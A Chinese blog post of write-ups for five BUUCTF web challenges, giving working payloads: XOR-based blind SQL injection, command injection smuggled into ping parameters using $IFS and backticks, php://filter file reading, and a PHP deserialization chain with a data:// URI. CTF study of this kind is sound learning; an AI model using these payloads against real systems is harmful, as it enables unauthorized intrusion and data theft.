---
layout: post
title: BUUCTF Web Training 0x02
data: 2020-05-20
categories: Notes
tags: 
 - BUUCTF
 - Writeup
description: 
excerpt_separator: ""
---

# [CISCN2019 华北赛区 Day2 Web1]Hack World

## 题目描述

一道SQL注入，直接提示了flag在"flag"表的"flag"列中。提示可以输入id。

## 解题思路

测试一下，输入`2/2`时返回与输入`1`时相同，说明是数字型注入，然后有一些过滤：union、and、or之类的，还有加减乘符号。

不过异或符号可用，那就好说了：

```
POST：id=0^(ascii(substr((select(flag)from(flag)),1,1))=102)
```

然后写脚本爆破就好。

## 备注

1. 遍历ASCII爆破速度还是太慢了，应该用二分法。

---

# [GXYCTF2019]Ping Ping Ping

## 题目描述

提示`/?ip=`，结合题目名字，很明显是RCE。

## 解题思路

一波测试，过滤了空格和引号，另外flag在flag.php里，那就读吧：

```
?ip=;cat$IFS`ls`
```

## 备注

1. \$IFS是bash的分隔符，默认为\<space>、\<tab>或\<newline>。
2. \$IFS后面不能直接拼接字符串，可以用在它们之间加一个\$1，\$1里什么都没有，起一个分隔作用。

---

# [ACTF2020 新生赛]Include

## 题目描述

你看URL，一个文件文件包含，直接用php://filter读。

---

# [ACTF2020 新生赛]Exec

## 题目描述

可以PING，又一个RCE。

## 解题思路

cat、ls命令都不可用了，不过echo和命令执行符号都可以用：

```
POST：target=;echo `cat /flag`
```

## 备注

1. 但是为什么，直接输入命令不可用，但可以通过命令执行符号调用。

---

# [ZJCTF 2019]NiZhuanSiWei

## 题目描述

直接给了源码：

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

## 解题思路

先绕\$text，很明显，用data协议：

```
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
```

然后有个文件包含和反序列化，猜测可利用的类在useless.php里，那就读一下 这个文件：

```
php://filter/read=convert.base64-encode/resource=useless.php
```

内容是这样的：

```php
<?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>
```

构造一下完事，Payload：

```
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```



---

